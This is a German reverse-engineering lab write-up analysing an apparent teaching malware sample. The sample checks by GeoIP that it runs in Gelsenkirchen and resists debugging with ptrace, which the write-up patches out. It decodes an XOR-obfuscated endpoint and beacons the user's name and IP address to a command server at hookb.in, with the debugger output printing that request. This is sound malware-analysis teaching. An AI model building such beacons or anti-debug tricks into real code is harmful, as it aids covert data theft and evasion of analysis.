@@ -1,0 +1,283 @@
+; lab 5
+Die Malware lässt sich nur in Gelsenkirchen ausführen:
+
+    sre@srevm:~/Downloads$ ./botclient
+    [*] Connecting to server #1
+    [*] Sending request #1
+    [!] Not executing in the target environment in Gelsenkirchen.
+
+Da GeoIP-Location oft ungenau ist, ist es nötig sich mit dem W-HS VPN zuverbinden,
+danach lässt sich die Malware ausführen:
+
+    sre@srevm:~/Downloads$ ./botclient
+    [*] Connecting to server #1
+    [*] Sending request #1
+    [*] Successfully reached target environment in Gelsenkirchen.
+    [*] Sending request to C&C server
+
+
+    [*] System engaged. WIPING WILL BEGIN IN 2 HOURS !!!
+
+Der erste Versuch ltrace an die Malware anzuhängen, beendet das Program vorzeitig:
+
+    sre@srevm:~/Downloads$ ltrace ./botclient > /dev/null
+    __libc_start_main(0x80495d0, 1, 0xff8d6dc4, 0x804a810 <unfinished ...>
+    ptrace(0, 0, 0, 0)                                           = 0xffffffff
+    fprintf(0xf74cacc0, "\nNice try...\n")                       = 13
+    +++ exited (status 1) +++
+
+Das bedeutet, das die Malware versucht sich selbst einen ptrace anzuhängen.
+Ist allerdings bereits ein ptrace vorhanden, bricht die Malware die Ausführung ab.
+Mittels einer statischen Analyse lässt sich der call nach ptrace finden und patchen:
+
+    0804960a  e8d1f2ffff   call    ptrace
+
+Der ptrace Call befindet sich an offset 0x160A in der ELF-Datei:
+                                   |..........|
+    0x00001600 0000 8985 80CB FFFF E8D1 F2FF FF89  ..‰…€ËÿÿèÑòÿÿ‰
+                                   |5 byte NOP|
+    0x00001600 0000 8985 80CB FFFF 0F1F 4400 0089  ..‰…€Ëÿÿ..D..‰
+
+Nachdem der ptrace call genopped wurde, lässt sich ltrace erfolgreich ausführen:
+
+    sre@srevm:~/Downloads$ ltrace ./botclient > /dev/null
+    __libc_start_main(0x80495d0, 1, 0xffe51784, 0x804a810 <unfinished ...>
+ ┌─ socket(2, 1, 0)                                              = 3
+ S  gethostbyname("ifconfig.co")                                 = 0xf7540960
+ T  fprintf(0xf753ed60, "[*] Connecting to server #1\n")         = 28
+ E  memset(0xffe4f6a0, '\0', 16)                                 = 0xffe4f6a0
+ P  htons(80, 0, 16, 0)                                          = 0x5000
+ 1  connect(3, 0xffe4f6a0, 16, 0)                                = 0
+    fprintf(0xf753ed60, "[*] Sending request #1\n")              = 23
+    fdopen(3, 0x804a91b, 16, 0)                                  = 0x924afe8
+    fprintf(0x924afe8, "GET /json HTTP/1.0\nHost: ifconfi"...)   = 38
+    fflush(0x924afe8)                                            = 0
+    memset(0xffe4f6cc, '\0', 4096)                               = 0xffe4f6cc
+    read(3, "HTTP/1.1 200 OK\r\nServer: nginx\r\n"..., 4095)     = 329
+    read(3, "", 3766)                                            = 0
+    fclose(0x924afe8)                                            = 0
+    memmem(0xffe4f6cc, 329, 0x804a968, 13)                       = 0xffe4f806
+ └─ fprintf(0xf753ed60, "[*] Successfully reached target "...)   = 62
+ ┌─ SSL_library_init(0xf753ed60, 0x804a9b5, 0x804a968, 13)       = 1
+ S  OPENSSL_add_all_algorithms_noconf(0xf771fcc0, 0xf760b3a6, 0xf7794000, 0xf776aa3b) = 1
+ T  SSL_load_error_strings(0xf771fcc0, 0xf760b3a6, 0xf7794000, 0xf776aa3b) = 0
+ E  TLSv1_2_client_method(0xf771fcc0, 0xf760b3a6, 0xf7794000, 0xf776aa3b) = 0xf77939a0
+ P  SSL_CTX_new(0xf77939a0, 0xf760b3a6, 0xf7794000, 0xf776aa3b)  = 0x925bd68
+ 2  gethostbyname("hookb.in")                                    = 0xf7540960
+    socket(2, 1, 0)                                              = 3
+    memset(0xffe4e0a0, '\0', 16)                                 = 0xffe4e0a0
+    htons(443, 0, 16, 0xf75fc75c)                                = 0xbb01
+    connect(3, 0xffe4e0a0, 16, 0xf75fc75c)                       = 0
+    SSL_new(0x925bd68, 443, 0x804a968, 13)                       = 0x925c5a0
+    SSL_set_fd(0x925c5a0, 3, 0x804a968, 13)                      = 1
+ └─ SSL_connect(0x925c5a0, 3, 0x804a968, 13)                     = 1
+ ┌─ getenv("USER")                                               = "sre"
+ S  memmem(0xffe4f6cc, 329, 0x804aa17, 4)                        = 0xffe4f7b6
+ T  sprintf("user=sre\n\r\n\r\n{"ip":"193.175.199."..., "user=%s\n%s", "sre", "\r\n\r\n{"ip":"193.175.199.107","ip_"...) = 104
+ E  fprintf(0xf753ed60, "[*] Sending request to C&C serve"...)   = 34
+ P  memset(0xffe4e270, '\0', 1024)                               = 0xffe4e270
+ 3  strlen("\324\340\266\267\311\270\275\344\216")               = 9
+    strlen("Z\340\266\267\311\270\275\344\216")                  = 9
+    strlen("Zn\266\267\311\270\275\344\216")                     = 9
+    strlen("Zn8\267\311\270\275\344\216")                        = 9
+    strlen("Zn89\311\270\275\344\216")                           = 9
+    strlen("Zn89G\270\275\344\216")                              = 9
+    strlen("Zn89G6\275\344\216")                                 = 9
+    strlen("Zn89G63\344\216")                                    = 9
+    strlen("Zn89G63j\216")                                       = 9
+    strlen("Zn89G63j")                                           = 8
+    strlen("user=sre\n\r\n\r\n{"ip":"193.175.199."...)           = 104
+    sprintf("POST /Zn89G63j HTTP/1.0\nHost: ho"..., "POST /%s HTTP/1.0\nHost: %s\nConte"..., "Zn89G63j", "hookb.in", 104, "user=sre\n\r\n\r\n{"ip":"193.175.199."...) = 195
+    strlen("POST /Zn89G63j HTTP/1.0\nHost: ho"...)               = 195
+    SSL_write(0x925c5a0, 0xffe4e270, 195, 0xffe4f687)            = 195
+ └─ memset(0xffe506cc, '\0', 4096)                               = 0xffe506cc
+ ┌─ SSL_read(0x925c5a0, 0xffe506cc, 4095, 0xffe4f687)            = 690
+ S  SSL_read(0x925c5a0, 0xffe5097e, 3405, 0xffe4f687)            = 0
+ T  SSL_free(0x925c5a0, 0xffe5097e, 3405, 0xffe4f687)            = 0
+ E  close(3)                                                     = 0
+ P  SSL_CTX_free(0x925bd68, 0xffe5097e, 3405, 0xffe4f687)        = 0
+ 4  printf(0xf753ed60, "\n\n[*] System engaged. WIPING WIL"...) = 57
+ └─ +++ exited (status 0) +++
+
+Durch die Lib-Calls lässt sich der Ablauf des Programmes gut nachvollziehen:
+
+1. http://ifconfig.co/json wird dazu genutzt um über GeoIP die aktuelle Stadt zuermitteln
+   Stadt == Gelsenkirchen ==> Ziel erreicht, weiter machen
+2. SSL Verbindung [TLS 1.2] mit C&C-Server aufbauen (https://hookb.in)
+3. Endpoint entschlüsseln: "Zn89G63j" und Bot am C&C-Server anmelden
+4. Antwort des C&C-Servers auslesen und Verbindung schließen
+
+Die Entschlüsselung des Endpoints wird in der Funktion sub_8048c30() durchgeführt, wobei die
+Addresse des verschlüsselten Strings[0xffffafdd] mittels Stack übergeben wird.
+Ist die Obfuksierung beseitigt stellt sich herraus, dass der String mittels XOR
+und dem Key 0xE8 entschlüsselt wird.
+
+Um die Kommunikation mit dem C&C-Server zuverstehen, ist es nötig den SSL Traffic auszulesen.
+Zum Senden und Empfangen von Daten über eine SSL Verbindung werden 2 verschiedene Methoden genutzt:
+
+    #include <openssl/ssl.h>
+    int SSL_write(SSL *ssl, const void *buf, int num);
+    int SSL_read(SSL *ssl, void *buf, int num);
+
+Wie aus den Signaturen von SSL_write und SSL_read erkennbar, werden die Daten in einem Buffer übergeben.
+Eine statische Analyse der Malware ergibt drei Verschiedene Calls zu den SSL_write/read Methoden:
+
+    0x0804a27b: SSL_write()
+    0x0804a39d: SSL_read()
+    0x0804a7b6: SSL_read()
+
+Um den POST-Request auszulesen wird mittels gdb-peda ein Breakpoint vor dem SSL_write() call bei 0x0804a27b gesetzet:
+
+    gdb-peda$ b *0x0804a27b
+    Haltepunkt 1 at 0x804a27b
+    gdb-peda$ r
+    Starting program: /home/sre/Downloads/botclient
+    [*] Connecting to server #1
+    [*] Sending request #1
+    [*] Successfully reached target environment in Gelsenkirchen.
+    [*] Sending request to C&C server
+
+    [----------------------------------registers-----------------------------------]
+    EAX: 0xc3
+    EBX: 0xffffff01
+    ECX: 0xffff9bf0 ("POST /Zn89G63j HTTP/1.0\nHost: hookb.in\nContent-Type: application/json\nContent-Length: 104\n\nuser=sre\n\r\n\r\n{\"ip\":\"193.175.199.107\",\"ip_decimal\":3249522539,\"country\":\"Germany\",\"city\":\"Gelsenkirchen\"}")
+    EDX: 0x3
+    ESI: 0xffff9a60 --> 0x805e998 --> 0x303
+    EDI: 0xffff9a60 --> 0x805e998 --> 0x303
+    EBP: 0xffffd068 --> 0x0
+    ESP: 0xffff9a60 --> 0x805e998 --> 0x303
+    EIP: 0x804a27b (call   0x8048990 <SSL_write@plt>)
+    EFLAGS: 0x200206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+    [-------------------------------------code-------------------------------------]
+       0x804a26d: mov    ecx,DWORD PTR [ebp-0x35c0]
+       0x804a273: mov    DWORD PTR [esp+0x4],ecx
+       0x804a277: mov    DWORD PTR [esp+0x8],eax
+    => 0x804a27b: call   0x8048990 <SSL_write@plt>
+       0x804a280: xor    ecx,ecx
+       0x804a282: mov    edx,0x1000
+       0x804a287: lea    esi,[ebp-0x101c]
+       0x804a28d: mov    DWORD PTR [esp],esi
+    Guessed arguments:
+    arg[0]: 0x805e998 --> 0x303
+    arg[1]: 0xffff9bf0 ("POST /Zn89G63j HTTP/1.0\nHost: hookb.in\nContent-Type: application/json\nContent-Length: 104\n\nuser=sre\n\r\n\r\n{\"ip\":\"193.175.199.107\",\"ip_decimal\":3249522539,\"country\":\"Germany\",\"city\":\"Gelsenkirchen\"}")
+    arg[2]: 0xc3
+    [------------------------------------stack-------------------------------------]
+    0000| 0xffff9a60 --> 0x805e998 --> 0x303
+    0004| 0xffff9a64 --> 0xffff9bf0 ("POST /Zn89G63j HTTP/1.0\nHost: hookb.in\nContent-Type: application/json\nContent-Length: 104\n\nuser=sre\n\r\n\r\n{\"ip\":\"193.175.199.107\",\"ip_decimal\":3249522539,\"country\":\"Germany\",\"city\":\"Gelsenkirchen\"}")
+    0008| 0xffff9a68 --> 0xc3
+    0012| 0xffff9a6c --> 0xffffb007 ("hookb.in")
+    0016| 0xffff9a70 --> 0x68 ('h')
+    0020| 0xffff9a74 --> 0xffff9ff0 ("user=sre\n\r\n\r\n{\"ip\":\"193.175.199.107\",\"ip_decimal\":3249522539,\"country\":\"Germany\",\"city\":\"Gelsenkirchen\"}")
+    0024| 0xffff9a78 --> 0x0
+    0028| 0xffff9a7c --> 0x0
+    [------------------------------------------------------------------------------]
+    Legend: code, data, rodata, value
+
+    Breakpoint 1, 0x0804a27b in ?? ()
+    gdb-peda$ x/s 0xffff9bf0
+    0xffff9bf0: "POST /Zn89G63j HTTP/1.0\nHost: hookb.in\nContent-Type: application/json\nContent-Length: 104\n\nuser=sre\n\r\n\r\n{\"ip\":\"193.175.199.107\",\"ip_decimal\":3249522539,\"country\":\"Germany\",\"city\":\"Gelsenkirchen\"}"
+
+Der POST request befindet sich an der 2. Stelle auf dem Stack (0xffff9bf0):
+
+    POST /Zn89G63j HTTP/1.0
+    Host: hookb.in
+    Content-Type: application/json
+    Content-Length: 104
+
+    user=sre
+
+    {"ip":"193.175.199.107","ip_decimal":3249522539,"country":"Germany","city":"Gelsenkirchen"}
+
+Der Inhalt kann als eine Art Anmeldung beim C&C-Server interpretiert werden, es wird sowohl der aktuelle Benutzername und
+die IP des PCs übermittelt.
+
+Die Antwort des Servers wird über SSL_read() empfangen, wobei nur der erste Call erfolgreich ist.
+Der 2. Call hat hat ret = 0, was laut man-page folgendes bedeutet:
+
+    "The read operation was not successful. The reason may either be a clean shutdown due to a "close notify"
+     alert sent by the peer. It is also possible, that the peer simply shut down the underlying transport and
+     the shutdown is incomplete." [https://wiki.openssl.org/index.php/Manual:SSL_read(3)#RETURN_VALUES]
+
+Um den Inhalt des 1. Reads auszulesen werden Breakpoints NACH den Aufrufen von ssl_read() gesetzt:
+
+    gdb-peda$ b *0x0804a3a2
+    Haltepunkt 1 at 0x804a3a2
+    gdb-peda$ b *0x0804a7bb
+    Haltepunkt 2 at 0x804a7bb
+    gdb-peda$ r
+    Starting program: /home/sre/Downloads/botclient
+    [*] Connecting to server #1
+    [*] Sending request #1
+    [*] Successfully reached target environment in Gelsenkirchen.
+    [*] Sending request to C&C server
+
+    [----------------------------------registers-----------------------------------]
+    EAX: 0x2b2
+    EBX: 0x1fe
+    ECX: 0xffffc240 ("ache, no-store, must-revalidate\r\nExpires: -1\r\nPragma: no-cache\r\nStrict-Transport-Security: max-age=31536000; includeSubdomains; preload\r\nX-UA-Compatible: IE=Edge,chrome=1\r\n\r\n{\"success\":true}")
+    EDX: 0x805f288 --> 0x0
+    ESI: 0xfff
+    EDI: 0x0
+    EBP: 0xffffd068 --> 0x0
+    ESP: 0xffff9a60 --> 0x805e998 --> 0x303
+    EIP: 0x804a3a2 (mov    ecx,0x58f5e152)
+    EFLAGS: 0x200282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
+    [-------------------------------------code-------------------------------------]
+       0x804a395: mov    DWORD PTR [esp+0x4],ecx
+       0x804a399: mov    DWORD PTR [esp+0x8],esi
+       0x804a39d: call   0x8048950 <SSL_read@plt>
+    => 0x804a3a2: mov    ecx,0x58f5e152
+       0x804a3a7: mov    edx,0x6a61281
+       0x804a3ac: mov    bl,0x1
+       0x804a3ae: mov    DWORD PTR [ebp-0x2020],eax
+       0x804a3b4: cmp    DWORD PTR [ebp-0x2020],0x0
+    [------------------------------------stack-------------------------------------]
+    0000| 0xffff9a60 --> 0x805e998 --> 0x303
+    0004| 0xffff9a64 --> 0xffffc04c ("HTTP/1.1 200 OK\r\nServer: nginx\r\nDate: Wed, 17 Jan 2018 11:42:10 GMT\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: 16\r\nConnection: close\r\nVary: X-HTTP-Method-Override\r\nAccess-Control-"...)
+    0008| 0xffff9a68 --> 0xfff
+    0012| 0xffff9a6c --> 0xffffb007 ("hookb.in")
+    0016| 0xffff9a70 --> 0x68 ('h')
+    0020| 0xffff9a74 --> 0xffff9ff0 ("user=sre\n\r\n\r\n{\"ip\":\"193.175.199.107\",\"ip_decimal\":3249522539,\"country\":\"Germany\",\"city\":\"Gelsenkirchen\"}")
+    0024| 0xffff9a78 --> 0x0
+    0028| 0xffff9a7c --> 0x0
+    [------------------------------------------------------------------------------]
+    Legend: code, data, rodata, value
+
+    Breakpoint 1, 0x0804a3a2 in ?? ()
+    gdb-peda$ x/4s 0xffffc04c
+    0xffffc04c: "HTTP/1.1 200 OK\r\nServer: nginx\r\nDate: Wed, 17 Jan 2018 11:42:10 GMT\r\nContent-Type: application/json; charset=utf-8\r\nContent-Length: 16\r\nConnection: close\r\nVary: X-HTTP-Method-Override\r\nAccess-Control-"...
+    0xffffc114: "Allow-Origin: *\r\nAccess-Control-Allow-Methods: GET, PUT, POST, DELETE\r\nAccess-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept\r\nX-RateLimit-Limit: 1000\r\nX-RateLimit-Reset: 3003\r\nX"...
+    0xffffc1dc: "-RateLimit-Remaining: 996\r\nX-Expires-At: Tue, 23 Jan 2018 15:17:38 GMT\r\nCache-Control: private, no-cache, no-store, must-revalidate\r\nExpires: -1\r\nPragma: no-cache\r\nStrict-Transport-Security: max-age=3"...
+    0xffffc2a4: "1536000; includeSubdomains; preload\r\nX-UA-Compatible: IE=Edge,chrome=1\r\n\r\n{\"success\":true}"
+
+Die Antwort des Servers befindet sich an der 2. Stelle auf dem Stack (0xffffc04c):
+
+    HTTP/1.1 200 OK
+    Server: nginx
+    Date: Wed, 17 Jan 2018 11:42:10 GMT
+    Content-Type: application/json; charset=utf-8
+    Content-Length: 16
+    Connection: close
+    Vary: X-HTTP-Method-Override
+    Access-Control-Allow-Origin: *
+    Access-Control-Allow-Methods: GET, PUT, POST, DELETE
+    Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept
+    X-RateLimit-Limit: 1000
+    X-RateLimit-Reset: 3003
+    X-RateLimit-Remaining: 996
+    X-Expires-At: Tue, 23 Jan 2018 15:17:38 GMT
+    Cache-Control: private, no-cache, no-store, must-revalidate
+    Expires: -1
+    Pragma: no-cache
+    Strict-Transport-Security: max-age=31536000; includeSubdomains; preload
+    X-UA-Compatible: IE=Edge,chrome=1
+
+    {"success":true}
+
+Der Inhalt kann so interpretiert werden, dass sich der Client erfolgreich beim Botnetz angemeldet hat.
+Der C&C-Server sendet allerdings keine weiteren Befehler, sondern signalisiert, dass die Verbindung
+nach dieser Response geschlossen wird ["Connection: close" siehe https://tools.ietf.org/html/rfc2616#section-14.10].
+
+Der Domain hookb.in ist eine shortURL für https://hookbin.com/ ein "free service that enables you to collect,
+parse and view HTTP requests."
+Der String "Zn89G63j" legt dabei die ID des Endpoints fest:  (aktuell auf Privat gesetzt).
